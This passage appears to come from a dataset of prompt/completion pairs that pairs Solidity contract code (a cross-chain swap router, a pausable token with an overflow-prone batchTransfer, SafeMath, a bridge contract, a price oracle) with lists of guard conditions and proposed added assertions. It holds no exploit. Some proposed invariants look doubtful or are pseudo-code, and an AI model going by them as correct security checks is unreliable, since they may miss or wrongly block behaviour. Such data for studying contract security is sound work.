amountIn, amountOutMin, cID(), toChainID);\n459     }\n460 \n461     // sets up a cross-chain trade from this chain to `toChainID` for `path` trades to `to`\n462     function anySwapOutExactTokensForNativeUnderlyingWithPermit(\n463         address from,\n464         uint amountIn,\n465         uint amountOutMin,\n466         address[] calldata path,\n467         address to,\n468         uint deadline,\n469         uint8 v,\n470         bytes32 r,\n471         bytes32 s,\n472         uint toChainID\n473     ) external virtual ensure(deadline) {\n474         address _underlying = AnyswapV1ERC20(path[0]).underlying();\n475         IERC20(_underlying).permit(from, address(this), amountIn, deadline, v, r, s);\n476         TransferHelper.safeTransferFrom(_underlying, from, path[0], amountIn);\n477         AnyswapV1ERC20(path[0]).depositVault(amountIn, from);\n478         AnyswapV1ERC20(path[0]).burn(from, amountIn);\n479         {\n480         address[] memory _path = path;\n481         address _from = from;\n482         address _to = to;\n483         uint _amountIn = amountIn;\n484         uint _amountOutMin = amountOutMin;\n485         uint _cID = cID();\n486         uint _toChainID = toChainID;\n487         emit LogAnySwapTradeTokensForNative(_path, _from, _to, _amountIn, _amountOutMin, _cID, _toChainID);\n488         }\n489     }\n490 \n491     // sets up a cross-chain trade from this chain to `toChainID` for `path` trades to `to`\n492     function anySwapOutExactTokensForNativeUnderlyingWithTransferPermit(\n493         address from,\n494         uint amountIn,\n495         uint amountOutMin,\n496         address[] calldata path,\n497         address to,\n498         uint deadline,\n499         uint8 v,\n500         bytes32 r,\n501         bytes32 s,\n502         uint toChainID\n503     ) external virtual ensure(deadline) {\n504         IERC20(AnyswapV1ERC20(path[0]).underlying()).transferWithPermit(from, path[0], amountIn, deadline, v, r, s);\n505         AnyswapV1ERC20(path[0]).depositVault(amountIn, from);\n506         AnyswapV1ERC20(path[0]).burn(from, amountIn);\n507         emit LogAnySwapTradeTokensForNative(path, from, to, amountIn, amountOutMin, cID(), toChainID);\n508     }\n509 \n510     // Swaps `amounts[path.length-1]` `path[path.length-1]` to `to` on this chain\n511     // Triggered by `anySwapOutExactTokensForNative`\n512     function anySwapInExactTokensForNative(\n513         bytes32 txs,\n514         uint amountIn,\n515         uint amountOutMin,\n516         address[] calldata path,\n517         address to,\n518         uint deadline,\n519         uint fromChainID\n520     ) external onlyMPC virtual ensure(deadline) returns (uint[] memory amounts) {\n521         require(path[path.length - 1] == wNATIVE, 'AnyswapV3Router: INVALID_PATH');\n522         amounts = SushiswapV2Library.getAmountsOut(factory, amountIn, path);\n523         require(amounts[amounts.length - 1] >= amountOutMin, 'AnyswapV3Router: INSUFFICIENT_OUTPUT_AMOUNT');\n524         _anySwapIn(txs, path[0],  SushiswapV2Library.pairFor(factory, path[0], path[1]), amounts[0], fromChainID);\n525         _swap(amounts, path, address(this));\n526         IwNATIVE(wNATIVE).withdraw(amounts[amounts.length - 1]);\n527         TransferHelper.safeTransferNative(to, amounts[amounts.length - 1]);\n528     }\n529 \n530     // **** LIBRARY FUNCTIONS ****\n531     function quote(uint amountA, uint reserveA, uint reserveB) public pure virtual returns (uint amountB) {\n532         return SushiswapV2Library.quote(amountA, reserveA, reserveB);\n533     }\n534 \n535     function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut)\n536         public\n537         pure\n538         virtual\n539         returns (uint amountOut)\n540     {\n541         return SushiswapV2Library.getAmountOut(amountIn, reserveIn, reserveOut);\n542     }\n543 \n544     function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut)\n545         public\n546         pure\n547         virtual\n548         returns (uint amountIn)\n549     {\n550         return SushiswapV2Library.getAmountIn(amountOut, reserveIn, reserveOut);\n551     }\n552 \n553     function getAmountsOut(uint amountIn, address[] memory path)\n554         public\n555         view\n556         virtual\n557         returns (uint[] memory amounts)\n558     {\n559         return SushiswapV2Library.getAmountsOut(factory, amountIn, path);\n560     }\n561 \n562     function getAmountsIn(uint amountOut, address[] memory path)\n563         public\n564         view\n565         virtual\n566         returns (uint[] memory amounts)\n567     {\n568         return SushiswapV2Library.getAmountsIn(factory, amountOut, path);\n569     }\n570 }",
        "completion": "15+  require((z = x + y) >= x, 'ds-math-add-overflow');\n19+  require((z = x - y) <= x, 'ds-math-sub-underflow');\n23+  require(y == 0 || (z = x * y) / y == x, 'ds-math-mul-overflow');\n32+  require(tokenA != tokenB, 'SushiswapV2Library: IDENTICAL_ADDRESSES');\n34+  require(token0 != address(0), 'SushiswapV2Library: ZERO_ADDRESS');\n57+  require(amountA > 0, 'SushiswapV2Library: INSUFFICIENT_AMOUNT');\n58+  require(reserveA > 0 && reserveB > 0, 'SushiswapV2Library: INSUFFICIENT_LIQUIDITY');\n64+  require(amountIn > 0, 'SushiswapV2Library: INSUFFICIENT_INPUT_AMOUNT');\n65+  require(reserveIn > 0 && reserveOut > 0, 'SushiswapV2Library: INSUFFICIENT_LIQUIDITY');\n74+  require(amountOut > 0, 'SushiswapV2Library: INSUFFICIENT_OUTPUT_AMOUNT');\n75+  require(reserveIn > 0 && reserveOut > 0, 'SushiswapV2Library: INSUFFICIENT_LIQUIDITY');\n83+  require(path.length >= 2, 'SushiswapV2Library: INVALID_PATH');\n94+  require(path.length >= 2, 'SushiswapV2Library: INVALID_PATH');\n109+ require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: APPROVE_FAILED');\n115+ require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: TRANSFER_FAILED');\n121+ require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: TRANSFER_FROM_FAILED');\n126+  require(success, 'TransferHelper: NATIVE_TRANSFER_FAILED');\n168+  modifier ensure(uint deadline) {\n            require(deadline >= block.timestamp, 'AnyswapV3Router: EXPIRED');\n              _;\n     }\n181+ assert(msg.sender == wNATIVE);\n196+  modifier onlyMPC() {\n        require(msg.sender == mpc(), \"AnyswapV3Router: FORBIDDEN\");\n         _;\n    }\n212 onlyMPC\n213+ require(newMPC != address(0), \"AnyswapV3Router: address(0x0)\");\n221 onlyMPC\n222+  require(newVault != address(0), \"AnyswapV3Router: address(0x0)\");\n291 onlyMPC\n296 onlyMPC\n302 onlyMPC\n312 onlyMPC\n318 onlyMPC\n360 ensure(deadline)\n379 ensure(deadline)\n409 ensure(deadline)\n428+  require(amounts[amounts.length - 1] >= amountOutMin, 'SushiswapV2Router: INSUFFICIENT_OUTPUT_AMOUNT');\n454 ensure(deadline)\n473 ensure(deadline)\n503 ensure(deadline)\n520 onlyMPC\n521+  require(path[path.length - 1] == wNATIVE, 'AnyswapV3Router: INVALID_PATH');\n523+   require(amounts[amounts.length - 1] >= amountOutMin, 'AnyswapV3Router: INSUFFICIENT_OUTPUT_AMOUNT');"
    },
    {
        "prompt": "1 contract PausableToken is StandardToken, Pausable {\n2 \n3   function transfer(address _to, uint256 _value) public whenNotPaused returns (bool) {\n4     return super.transfer(_to, _value);\n5   }\n6 \n7   function transferFrom(address _from, address _to, uint256 _value) public whenNotPaused returns (bool) {\n8     return super.transferFrom(_from, _to, _value);\n9   }\n10 \n11   function approve(address _spender, uint256 _value) public whenNotPaused returns (bool) {\n12     return super.approve(_spender, _value);\n13   }\n14   \n15   function batchTransfer(address[] _receivers, uint256 _value) public whenNotPaused returns (bool) {\n16     uint cnt = _receivers.length;\n17     uint256 amount = uint256(cnt) * _value;\n18     require(cnt > 0 && cnt <= 20);\n19     require(_value > 0 && balances[msg.sender] >= amount);\n20 \n21     balances[msg.sender] = balances[msg.sender].sub(amount);\n22     for (uint i = 0; i < cnt; i++) {\n23         balances[_receivers[i]] = balances[_receivers[i]].add(_value);\n24         Transfer(msg.sender, _receivers[i], _value);\n25     }\n26     return true;\n27   }\n28 }",
        "completion": "18 require(cnt > 0 && cnt <= 20);\n19 require(_value > 0 && balances[msg.sender] >= amount);\n19+ assert(amount >0);"
    },
    {
        "prompt": "1 library SafeMath {\n2   function mul(uint256 a, uint256 b) internal constant returns (uint256) {\n3     uint256 c = a * b;\n4     assert(a == 0 || c / a == b);\n5     return c;\n6   }\n7 \n8   function div(uint256 a, uint256 b) internal constant returns (uint256) {\n9     // assert(b > 0); // Solidity automatically throws when dividing by 0\n10     uint256 c = a / b;\n11     // assert(a == b * c + a % b); // There is no case in which this doesn't hold\n12     return c;\n13   }\n14 \n15   function sub(uint256 a, uint256 b) internal constant returns (uint256) {\n16     assert(b <= a);\n17     return a - b;\n18   }\n19 \n20   function add(uint256 a, uint256 b) internal constant returns (uint256) {\n21     uint256 c = a + b;\n22     assert(c >= a);\n23     return c;\n24   }\n25 }",
        "completion": "4 assert(a == 0 || c / a == b);\n16 assert(b <= a);\n22 assert(c >= a);"
    },
    {
        "prompt": "1 abstract contract MappingBase is ContextUpgradeSafe, Constants {\n2         using SafeMath for uint;\n3 \n4     bytes32 public constant RECEIVE_TYPEHASH = keccak256(\"Receive(uint256 fromChainId,address to,uint256 nonce,uint256 volume,address signatory)\");\n5     bytes32 public constant DOMAIN_TYPEHASH = keccak256(\"EIP712Domain(string name,uint256 chainId,address verifyingContract)\");\n6     bytes32 internal _DOMAIN_SEPARATOR;\n7     function DOMAIN_SEPARATOR() virtual public view returns (bytes32) {  return _DOMAIN_SEPARATOR;  }\n8 \n9     address public factory;\n10     uint256 public mainChainId;\n11     address public token;\n12     address public deployer;\n13     \n14     mapping (address => uint) internal _authQuotas;                                     // signatory => quota\n15     mapping (uint => mapping (address => uint)) public sentCount;                       // toChainId => to => sentCount\n16     mapping (uint => mapping (address => mapping (uint => uint))) public sent;          // toChainId => to => nonce => volume\n17     mapping (uint => mapping (address => mapping (uint => uint))) public received;      // fromChainId => to => nonce => volume\n18     mapping (address => uint) public lasttimeUpdateQuotaOf;                             // signatory => lasttime\n19     uint public autoQuotaRatio;\n20     uint public autoQuotaPeriod;\n21     \n22     function setAutoQuota(uint ratio, uint period) virtual external onlyFactory {\n23         autoQuotaRatio  = ratio;\n24         autoQuotaPeriod = period;\n25     }\n26     \n27     modifier onlyFactory {\n28         require(msg.sender == factory, 'Only called by Factory');\n29         _;\n30     }\n31     \n32     modifier updateAutoQuota(address signatory) virtual {\n33         uint quota = authQuotaOf(signatory);\n34         if(_authQuotas[signatory] != quota) {\n35             _authQuotas[signatory] = quota;\n36             lasttimeUpdateQuotaOf[signatory] = now;\n37         }\n38         _;\n39     }\n40     \n41     function authQuotaOf(address signatory) virtual public view returns (uint quota) {\n42         quota = _authQuotas[signatory];\n43         uint ratio  = autoQuotaRatio  != 0 ? autoQuotaRatio  : Factory(factory).getConfig(_autoQuotaRatio_);\n44         uint period = autoQuotaPeriod != 0 ? autoQuotaPeriod : Factory(factory).getConfig(_autoQuotaPeriod_);\n45         if(ratio == 0 || period == 0 || period == uint(-1))\n46             return quota;\n47         uint quotaCap = cap().mul(ratio).div(1e18);\n48         uint delta = quotaCap.mul(now.sub(lasttimeUpdateQuotaOf[signatory])).div(period);\n49         return Math.max(quota, Math.min(quotaCap, quota.add(delta)));\n50     }\n51     \n52     function cap() public view virtual returns (uint);\n53 \n54     function increaseAuthQuotas(address[] memory signatories, uint[] memory increments) virtual external returns (uint[] memory quotas) {\n55         require(signatories.length == increments.length, 'two array lenth not equal');\n56         quotas = new uint[](signatories.length);\n57         for(uint i=0; i<signatories.length; i++)\n58             quotas[i] = increaseAuthQuota(signatories[i], increments[i]);\n59     }\n60     \n61     function increaseAuthQuota(address signatory, uint increment) virtual public updateAutoQuota(signatory) onlyFactory returns (uint quota) {\n62         quota = _authQuotas[signatory].add(increment);\n63         _authQuotas[signatory] = quota;\n64         emit IncreaseAuthQuota(signatory, increment, quota);\n65     }\n66     event IncreaseAuthQuota(address indexed signatory, uint increment, uint quota);\n67     \n68     function decreaseAuthQuotas(address[] memory signatories, uint[] memory decrements) virtual external returns (uint[] memory quotas) {\n69         require(signatories.length == decrements.length, 'two array lenth not equal');\n70         quotas = new uint[](signatories.length);\n71         for(uint i=0; i<signatories.length; i++)\n72             quotas[i] = decreaseAuthQuota(signatories[i], decrements[i]);\n73     }\n74     \n75     function decreaseAuthQuota(address signatory, uint decrement) virtual public onlyFactory returns (uint quota) {\n76         quota = authQuotaOf(signatory);\n77         if(quota < decrement)\n78             decrement = quota;\n79         return _decreaseAuthQuota(signatory, decrement);\n80     }\n81     \n82     function _decreaseAuthQuota(address signatory, uint decrement) virtual internal updateAutoQuota(signatory) returns (uint quota) {\n83         quota = _authQuotas[signatory].sub(decrement);\n84         _authQuotas[signatory] = quota;\n85         emit DecreaseAuthQuota(signatory, decrement, quota);\n86     }\n87     event DecreaseAuthQuota(address indexed signatory, uint decrement, uint quota);\n88     \n89 \n90     function needApprove() virtual public pure returns (bool);\n91     \n92     function send(uint toChainId, address to, uint volume) virtual external payable returns (uint nonce) {\n93         return sendFrom(_msgSender(), toChainId, to, volume);\n94     }\n95     \n96     function sendFrom(address from, uint toChainId, address to, uint volume) virtual public payable returns (uint nonce) {\n97         _chargeFee();\n98         _sendFrom(from, volume);\n99         nonce = sentCount[toChainId][to]++;\n100         sent[toChainId][to][nonce] = volume;\n101         emit Send(from, toChainId, to, nonce, volume);\n102     }\n103     event Send(address indexed from, uint indexed toChainId, address indexed to, uint nonce, uint volume);\n104     \n105     function _sendFrom(address from, uint volume) virtual internal;\n106 \n107     function receive(uint256 fromChainId, address to, uint256 nonce, uint256 volume, Signature[] memory signatures) virtual external payable {\n108         _chargeFee();\n109         require(received[fromChainId][to][nonce] == 0, 'withdrawn already');\n110         uint N = signatures.length;\n111         require(N >= Factory(factory).getConfig(_minSignatures_), 'too few signatures');\n112         for(uint i=0; i<N; i++) {\n113             for(uint j=0; j<i; j++)\n114                 require(signatures[i].signatory != signatures[j].signatory, 'repetitive signatory');\n115             bytes32 structHash = keccak256(abi.encode(RECEIVE_TYPEHASH, fromChainId, to, nonce, volume, signatures[i].signatory));\n116             bytes32 digest = keccak256(abi.encodePacked(\"\\x19\\x01\", _DOMAIN_SEPARATOR, structHash));\n117             address signatory = ecrecover(digest, signatures[i].v, signatures[i].r, signatures[i].s);\n118             require(signatory != address(0), \"invalid signature\");\n119             require(signatory == signatures[i].signatory, \"unauthorized\");\n120             _decreaseAuthQuota(signatures[i].signatory, volume);\n121             emit Authorize(fromChainId, to, nonce, volume, signatory);\n122         }\n123         received[fromChainId][to][nonce] = volume;\n124         _receive(to, volume);\n125         emit Receive(fromChainId, to, nonce, volume);\n126     }\n127     event Receive(uint256 indexed fromChainId, address indexed to, uint256 indexed nonce, uint256 volume);\n128     event Authorize(uint256 fromChainId, address indexed to, uint256 indexed nonce, uint256 volume, address indexed signatory);\n129     \n130     function _receive(address to, uint256 volume) virtual internal;\n131     \n132     function _chargeFee() virtual internal {\n133         require(msg.value >= Math.min(Factory(factory).getConfig(_fee_), 0.1 ether), 'fee is too low');\n134         address payable feeTo = address(Factory(factory).getConfig(_feeTo_));\n135         if(feeTo == address(0))\n136             feeTo = address(uint160(factory));\n137         feeTo.transfer(msg.value);\n138         emit ChargeFee(_msgSender(), feeTo, msg.value);\n139     }\n140     event ChargeFee(address indexed from, address indexed to, uint value);\n141 \n142     uint256[47] private __gap;\n143 }    ",
        "completion": "22  onlyFactory \n27  modifier onlyFactory {\n            require(msg.sender == factory, 'Only called by Factory');\n              _; \n     }\n55 require(signatories.length == increments.length, 'two array lenth not equal');\n69 require(signatories.length == decrements.length, 'two array lenth not equal');\n109 require(received[fromChainId][to][nonce] == 0, 'withdrawn already');\n111 require(N >= Factory(factory).getConfig(_minSignatures_), 'too few signatures');\n118 require(signatory != address(0), \"invalid signature\");\n119 require(signatory == signatures[i].signatory, \"unauthorized\");\n119+ assert(to == signatory);\n133 require(msg.value >= Math.min(Factory(factory).getConfig(_fee_), 0.1 ether), 'fee is too low');"
    },
    {
        "prompt": "1     function getYvTokenPrice(address token) internal view returns (uint256) {\n2         YvTokenInfo memory yvTokenInfo = yvTokens[token];\n3         require(yvTokenInfo.isYvToken, \"not a Yvault token\");\n4  \n5         uint256 pricePerShare;\n6         address underlying;\n7         if (yvTokenInfo.version == YvTokenVersion.V1) {\n8             pricePerShare = YVaultV1Interface(token).getPricePerFullShare();\n9             underlying = YVaultV1Interface(token).token();\n10         } else {\n11             pricePerShare = YVaultV2Interface(token).pricePerShare();\n12             underlying = YVaultV2Interface(token).token();\n13         }\n14  \n15         uint256 underlyingPrice;\n16         if (crvTokens[underlying].isCrvToken) {\n17             underlyingPrice = getCrvTokenPrice(underlying);\n18         } else {\n19             underlyingPrice = getTokenPrice(underlying);\n20         }\n21         return mul_(underlyingPrice, Exp({mantissa: pricePerShare}));\n22     }",
        "completion": "3  require(yvTokenInfo.isYvToken, \"not a Yvault token\"); \n11+ assert(pricePerShare <= k*Old(pricePerShare));"
    },
    {
        "prompt": "1 pragma solidity ^0.5.16;\n2 pragma experimental ABIEncoderV2;\n3 \n4 import \"./Denominations.sol\";\n5 import \"./PriceOracle.sol\";\n6 import \"./interfaces/CurveTokenInterface.sol\";\n7 import \"./interfaces/FeedRegistryInterface.sol\";\n8 import \"./interfaces/UniswapV2Interface.sol\";\n9 import \"./interfaces/V1PriceOracleInterface.sol\";\n10 import \"./interfaces/XSushiExchangeRateInterface.sol\";\n11 import \"./interfaces/YVaultTokenInterface.sol\";\n12 import \"../CErc20.sol\";\n13 import \"../CToken.sol\";\n14 import \"../Exponential.sol\";\n15 import \"../EIP20Interface.sol\";\n16 \n17 contract PriceOracleProxy is PriceOracle, Exponential, Denominations {\n18     /// @notice Yvault token version, currently support v1 and v2\n19     enum YvTokenVersion {\n20         V1,\n21         V2\n22     }\n23 \n24     /// @notice Curve token version, currently support v1, v2 and v3\n25     enum CurveTokenVersion {\n26         V1,\n27         V2,\n28         V3\n29     }\n30 \n31     /// @notice Curve pool type, currently support ETH and USD base\n32     enum CurvePoolType {\n33         ETH,\n34         USD\n35     }\n36 \n37     struct YvTokenInfo {\n38         /// @notice Check if this token is a Yvault token\n39         bool isYvToken;\n40         /// @notice The version of Yvault\n41         YvTokenVersion version;\n42     }\n43 \n44     struct CrvTokenInfo {\n45         /// @notice Check if this token is a curve pool token\n46         bool isCrvToken;\n47         /// @notice The curve pool type\n48         CurvePoolType poolType;\n49         /// @notice The curve swap contract address\n50         address curveSwap;\n51     }\n52 \n53     struct AggregatorInfo {\n54         /// @notice The base\n55         address base;\n56         /// @notice The quote denomination\n57         address quote;\n58         /// @notice It's being used or not\n59         bool isUsed;\n60     }\n61 \n62     /// @notice Admin address\n63     address public admin;\n64 \n65     /// @notice Guardian address\n66     address public guardian;\n67 \n68     /// @notice Indicator that this is a PriceOracle contract (for inspection)\n69     bool public constant isPriceOracle = true;\n70 \n71     /// @notice The v1 price oracle, which will continue to serve prices for v1 assets\n72     V1PriceOracleInterface public v1PriceOracle;\n73 \n74     /// @notice The ChainLink registry address\n75     FeedRegistryInterface public registry;\n76 \n77     /// @notice ChainLink quotes\n78     mapping(address => AggregatorInfo) public aggregators;\n79 \n80     /// @notice Check if the underlying address is Uniswap or SushiSwap LP\n81     mapping(address => bool) public isUnderlyingLP;\n82 \n83     /// @notice Yvault token data\n84     mapping(address => YvTokenInfo) public yvTokens;\n85 \n86     /// @notice Curve pool token data\n87     mapping(address => CrvTokenInfo) public crvTokens;\n88 \n89     /// @notice BTC related addresses. All these underlying we use `Denominations.BTC` as the aggregator base.\n90     address[6] public btcAddresses = [\n91         0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599, // WBTC\n92         0xEB4C2781e4ebA804CE9a9803C67d0893436bB27D, // renBTC\n93         0x9BE89D2a4cd102D8Fecc6BF9dA793be995C22541, // BBTC\n94         0x8dAEBADE922dF735c38C80C7eBD708Af50815fAa, // tBTC\n95         0x0316EB71485b0Ab14103307bf65a021042c6d380, // HBTC\n96         0xc4E15973E6fF2A35cC804c2CF9D2a1b817a8b40F // ibBTC\n97     ];\n98 \n99     address public cEthAddress;\n100 \n101     address public constant usdcAddress = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;\n102     address public constant wethAddress = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\n103     address public constant sushiAddress = 0x6B3595068778DD592e39A122f4f5a5cF09C90fE2;\n104     address public constant xSushiExRateAddress = 0x851a040fC0Dcbb13a272EBC272F2bC2Ce1e11C4d;\n105     address public constant crXSushiAddress = 0x228619CCa194Fbe3Ebeb2f835eC1eA5080DaFbb2;\n106 \n107     /**\n108      * @param admin_ The address of admin to set aggregators, LPs, curve tokens, or Yvault tokens\n109      * @param v1PriceOracle_ The address of the v1 price oracle, which will continue to operate and hold prices for collateral assets\n110      * @param cEthAddress_ The address of cETH, which will return a constant 1e18, since all prices relative to ether\n111      * @param registry_ The address of ChainLink registry\n112      */\n113     constructor(\n114         address admin_,\n115         address v1PriceOracle_,\n116         address cEthAddress_,\n117         address registry_\n118     ) public {\n119         admin = admin_;\n120         v1PriceOracle = V1PriceOracleInterface(v1PriceOracle_);\n121         cEthAddress = cEthAddress_;\n122         registry = FeedRegistryInterface(registry_);\n123     }\n124 \n125     /**\n126      * @notice Get the underlying price of a listed cToken asset\n127      * @param cToken The cToken to get the underlying price of\n128      * @return The underlying asset price mantissa (scaled by 1e18)\n129      */\n130     function getUnderlyingPrice(CToken cToken) public view returns (uint256) {\n131         address cTokenAddress = address(cToken);\n132         if (cTokenAddress == cEthAddress) {\n133             // ether always worth 1\n134             return 1e18;\n135         } else if (cTokenAddress == crXSushiAddress) {\n136             // Handle xSUSHI.\n137             uint256 exchangeRate = XSushiExchangeRateInterface(xSushiExRateAddress).getExchangeRate();\n138             return mul_(getTokenPrice(sushiAddress), Exp({mantissa: exchangeRate}));\n139         }\n140 \n141         address underlying = CErc20(cTokenAddress).underlying();\n142 \n143         // Handle LP tokens.\n144         if (isUnderlyingLP[underlying]) {\n145             return getLPFairPrice(underlying);\n146         }\n147 \n148         // Handle Yvault tokens.\n149         if (yvTokens[underlying].isYvToken) {\n150             return getYvTokenPrice(underlying);\n151         }\n152 \n153         // Handle curve pool tokens.\n154         if (crvTokens[underlying].isCrvToken) {\n155             return getCrvTokenPrice(underlying);\n156         }\n157 \n158         return getTokenPrice(underlying);\n159     }\n160 \n161     /*** Internal fucntions ***/\n162 \n163     /**\n164      * @notice Get the price of a specific token. Return 1e18 is it's WETH.\n165      * @param token The token to get the price of\n166      * @return The price\n167      */\n168     function getTokenPrice(address token) internal view returns (uint256) {\n169         if (token == wethAddress) {\n170             // weth always worth 1\n171             return 1e18;\n172         }\n173 \n174         AggregatorInfo memory aggregatorInfo = aggregators[token];\n175         if (aggregatorInfo.isUsed) {\n176             uint256 price = getPriceFromChainlink(aggregatorInfo.base, aggregatorInfo.quote);\n177             if (aggregatorInfo.quote == Denominations.USD) {\n178                 // Convert the price to ETH based if it's USD based.\n179                 price = mul_(price, Exp({mantissa: getUsdcEthPrice()}));\n180             }\n181             uint256 underlyingDecimals = EIP20Interface(token).decimals();\n182             return mul_(price, 10**(18 - underlyingDecimals));\n183         }\n184         return getPriceFromV1(token);\n185     }\n186 \n187     /**\n188      * @notice Get price from ChainLink\n189      * @param base The base token that ChainLink aggregator gets the price of\n190      * @param quote The quote token, currenlty support ETH and USD\n191      * @return The price, scaled by 1e18\n192      */\n193     function getPriceFromChainlink(address base, address quote) internal view returns (uint256) {\n194         (, int256 price, , , ) = registry.latestRoundData(base, quote);\n195         require(price > 0, \"invalid price\");\n196 \n197         // Extend the decimals to 1e18.\n198         return mul_(uint256(price), 10**(18 - uint256(registry.decimals(base, quote))));\n199     }\n200 \n201     /**\n202      * @notice Get the fair price of a LP. We use the mechanism from Alpha Finance.\n203      *         Ref: https://blog.alphafinance.io/fair-lp-token-pricing/\n204      * @param pair The pair of AMM (Uniswap or SushiSwap)\n205      * @return The price\n206      */\n207     function getLPFairPrice(address pair) internal view returns (uint256) {\n208         address token0 = IUniswapV2Pair(pair).token0();\n209         address token1 = IUniswapV2Pair(pair).token1();\n210         uint256 totalSupply = IUniswapV2Pair(pair).totalSupply();\n211         (uint256 r0, uint256 r1, ) = IUniswapV2Pair(pair).getReserves();\n212         uint256 sqrtR = sqrt(mul_(r0, r1));\n213         uint256 p0 = getTokenPrice(token0);\n214         uint256 p1 = getTokenPrice(token1);\n215         uint256 sqrtP = sqrt(mul_(p0, p1));\n216         return div_(mul_(2, mul_(sqrtR, sqrtP)), totalSupply);\n217     }\n218 \n219     /**\n220      * @notice Get price for Yvault tokens\n221      * @param token The Yvault token\n222      * @return The price\n223      */\n224     function getYvTokenPrice(address token) internal view returns (uint256) {\n225         YvTokenInfo memory yvTokenInfo = yvTokens[token];\n226         require(yvTokenInfo.isYvToken, \"not a Yvault token\");\n227 \n228         uint256 pricePerShare;\n229         address underlying;\n230         if (yvTokenInfo.version == YvTokenVersion.V1) {\n231             pricePerShare = YVaultV1Interface(token).getPricePerFullShare();\n232             underlying = YVaultV1Interface(token).token();\n233         } else {\n234             pricePerShare = YVaultV2Interface(token).pricePerShare();\n235             underlying = YVaultV2Interface(token).token();\n236         }\n237 \n238         uint256 underlyingPrice;\n239         if (crvTokens[underlying].isCrvToken) {\n240             underlyingPrice = getCrvTokenPrice(underlying);\n241         } else {\n242             underlyingPrice = getTokenPrice(underlying);\n243         }\n244         return mul_(underlyingPrice, Exp({mantissa: pricePerShare}));\n245     }\n246 \n247     /**\n248      * @notice Get price for curve pool tokens\n249      * @param token The curve pool token\n250      * @return The price\n251      */\n252     function getCrvTokenPrice(address token) internal view returns (uint256) {\n253         CrvTokenInfo memory crvTokenInfo = crvTokens[token];\n254         require(crvTokenInfo.isCrvToken, \"not a curve pool token\");\n255 \n256         uint256 virtualPrice = CurveSwapInterface(crvTokenInfo.curveSwap).get_virtual_price();\n257         if (crvTokenInfo.poolType == CurvePoolType.ETH) {\n258             return virtualPrice;\n259         }\n260 \n261         // We treat USDC as USD and convert the price to ETH base.\n262         return mul_(getUsdcEthPrice(), Exp({mantissa: virtualPrice}));\n263     }\n264 \n265     /**\n266      * @notice Get USDC price\n267      * @dev We treat USDC as USD for convenience\n268      * @return The USDC price\n269      */\n270     function getUsdcEthPrice() internal view returns (uint256) {\n271         return getTokenPrice(usdcAddress) / 1e12;\n272     }\n273 \n274     /**\n275      * @notice Get price from v1 price oracle\n276      * @param token The token to get the price of\n277      * @return The price\n278      */\n279     function getPriceFromV1(address token) internal view returns (uint256) {\n280         return v1PriceOracle.assetPrices(token);\n281     }\n282 \n283     /**\n284      * @notice Compare two strings are the same or not\n285      * @param a The first string\n286      * @param b The second string\n287      * @return The same or not\n288      */\n289     function compareStrings(string memory a, string memory b) internal pure returns (bool) {\n290         return (keccak256(abi.encodePacked((a))) == keccak256(abi.encodePacked((b))));\n291     }\n292 \n293     /**\n294      * @notice Check if the token is one of BTC relared address\n295      * @param token The token address\n296      * @return It's BTC or not\n297      */\n298     function isBtcAddress(address token) internal returns (bool) {\n299         for (uint256 i = 0; i < btcAddresses.length; i++) {\n300             if (btcAddresses[i] == token) {\n301                 return true;\n302             }\n303         }\n304         return false;\n305     }\n306 \n307     /*** Admin or guardian functions ***/\n308 \n309     event AggregatorUpdated(address tokenAddress, address base, address quote, bool isUsed);\n310     event IsLPUpdated(address tokenAddress, bool isLP);\n311     event SetYVaultToken(address token, YvTokenVersion version);\n312     event SetCurveToken(address token, CurvePoolType poolType, address swap);\n313     event SetGuardian(address guardian);\n314     event SetAdmin(address admin);\n315 \n316     /**\n317      * @notice Set ChainLink aggregators for multiple tokens\n318      * @param tokenAddresses The list of underlying tokens\n319      * @param quotes The list of ChainLink aggregator quotes, currently support 'ETH' and 'USD'\n320      */\n321     function _setAggregators(address[] calldata tokenAddresses, string[] calldata quotes) external {\n322         require(msg.sender == admin || msg.sender == guardian, \"only the admin or guardian may set the aggregators\");\n323         require(tokenAddresses.length == quotes.length, \"mismatched data\");\n324         for (uint256 i = 0; i < tokenAddresses.length; i++) {\n325             address base;\n326             address quote;\n327             bool isUsed;\n328             if (bytes(quotes[i]).length != 0) {\n329                 require(msg.sender == admin, \"guardian may only clear the aggregator\");\n330                 isUsed = true;\n331 \n332                 base = tokenAddresses[i];\n333                 if (isBtcAddress(tokenAddresses[i])) {\n334                     base = Denominations.BTC;\n335                 }\n336 \n337                 if (compareStrings(quotes[i], \"ETH\")) {\n338                     quote = Denominations.ETH;\n339                 } else if (compareStrings(quotes[i], \"USD\")) {\n340                     quote = Denominations.USD;\n341                 } else {\n342                     revert(\"unsupported denomination\");\n343                 }\n344 \n345                 // Make sure the aggregator exists.\n346                 address aggregator = registry.getFeed(base, quote);\n347                 require(registry.isFeedEnabled(aggregator), \"aggregator not enabled\");\n348             }\n349             aggregators[tokenAddresses[i]] = AggregatorInfo({base: base, quote: quote, isUsed: isUsed});\n350             emit AggregatorUpdated(tokenAddresses[i], base, quote, isUsed);\n351         }\n352     }\n353 \n354     /**\n355      * @notice See assets as LP tokens for multiple tokens\n356      * @param tokenAddresses The list of tokens\n357      * @param isLP The list of cToken properties (it's LP or not)\n358      */\n359     function _setLPs(address[] calldata tokenAddresses, bool[] calldata isLP) external {\n360         require(msg.sender == admin, \"only the admin may set LPs\");\n361         require(tokenAddresses.length == isLP.length, \"mismatched data\");\n362         for (uint256 i = 0; i < tokenAddresses.length; i++) {\n363             isUnderlyingLP[tokenAddresses[i]] = isLP[i];\n364             if (isLP[i]) {\n365                 // Sanity check to make sure the token is LP.\n366                 IUniswapV2Pair(tokenAddresses[i]).token0();\n367                 IUniswapV2Pair(tokenAddresses[i]).token1();\n368             }\n369             emit IsLPUpdated(tokenAddresses[i], isLP[i]);\n370         }\n371     }\n372 \n373     /**\n374      * @notice See assets as Yvault tokens for multiple tokens\n375      * @param tokenAddresses The list of tokens\n376      * @param version The list of vault version\n377      */\n378     function _setYVaultTokens(address[] calldata tokenAddresses, YvTokenVersion[] calldata version) external {\n379         require(msg.sender == admin, \"only the admin may set 